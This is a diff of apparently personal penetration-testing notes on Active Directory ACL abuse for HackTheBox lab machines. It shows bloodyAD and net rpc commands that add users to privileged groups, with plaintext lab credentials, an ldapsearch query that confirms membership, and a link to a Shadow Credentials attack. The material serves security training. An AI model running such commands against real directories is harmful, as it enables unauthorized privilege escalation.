@@ -1,4 +1,6 @@
 #ACL
+
+adding user to group
 ```bash
 bloodyAD --host puppy.htb -u levi.james -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james
 ```
@@ -7,8 +9,7 @@ bloodyAD --host puppy.htb -u levi.james -p 'KingofAkron2025!' add groupMember DE
 `net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "DC01.FLUFFY.HTB"`
 ```
 
-check user in group:
-
+check if the user is added in the group:
 ```bash
 ldapsearch -x -H ldap://10.10.11.72 \
   -D 'alfred@tombwatcher.htb' -w 'basketball' \
@@ -16,3 +17,7 @@ ldapsearch -x -H ldap://10.10.11.72 \
   member
 
 ```
+
+---
+
+[[Shadow Credentials]] attack
